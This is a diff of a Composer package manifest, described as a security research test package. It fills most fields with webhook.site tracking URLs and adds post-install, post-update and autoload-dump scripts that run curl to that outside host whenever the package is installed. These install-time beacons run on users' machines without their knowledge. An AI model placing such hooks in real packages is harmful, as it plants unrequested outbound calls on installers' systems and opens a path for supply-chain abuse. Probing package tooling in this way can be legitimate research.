@@ -1,15 +1,66 @@
 {
     "name": "ramlal123105/test",
-    "description": "A test package for security research",
+    "description": "Security research test package - do not use in production",
     "type": "library",
     "license": "MIT",
+    "version": "1.0.0",
     "authors": [
         {
-            "name": "Test User",
-            "email": "20146909-251c-4364-be26-92c1c2526752@emailhook.site"
+            "name": "Test Researcher",
+            "email": "test@example.com",
+            "homepage": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=author_homepage"
         }
     ],
-    "minimum-stability": "dev",
-    "require": {},
-    "readme": "README.md"
+    "homepage": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=homepage",
+    "readme": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=readme",
+    "support": {
+        "email": "test@example.com",
+        "issues": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=support_issues",
+        "source": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=support_source",
+        "docs": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=support_docs",
+        "rss": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=support_rss",
+        "chat": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=support_chat"
+    },
+    "require": {
+        "php": ">=7.4"
+    },
+    "require-dev": {
+        "phpunit/phpunit": "^9.0"
+    },
+    "extra": {
+        "branch-alias": {
+            "dev-main": "1.0.x-dev"
+        },
+        "webhook-test": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=extra_webhook",
+        "callback": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=extra_callback",
+        "test-endpoint": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=extra_test"
+    },
+    "scripts": {
+        "post-install-cmd": [
+            "curl -s 'https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=script_post_install'"
+        ],
+        "post-update-cmd": [
+            "curl -s 'https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=script_post_update'"
+        ],
+        "post-autoload-dump": [
+            "curl -s 'https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=script_autoload_dump'"
+        ],
+        "test-script": [
+            "curl -s 'https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=script_test'"
+        ]
+    },
+    "dist": {
+        "type": "zip",
+        "url": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=dist_url"
+    },
+    "source": {
+        "type": "git",
+        "url": "https://github.com/ramlal123105/test.git",
+        "reference": "main"
+    },
+    "notification-url": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=notification_url",
+    "keywords": [
+        "webhook-test-https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=keyword_test"
+    ],
+    "abandoned": "https://webhook.site/20146909-251c-4364-be26-92c1c2526752?field=abandoned"
 }
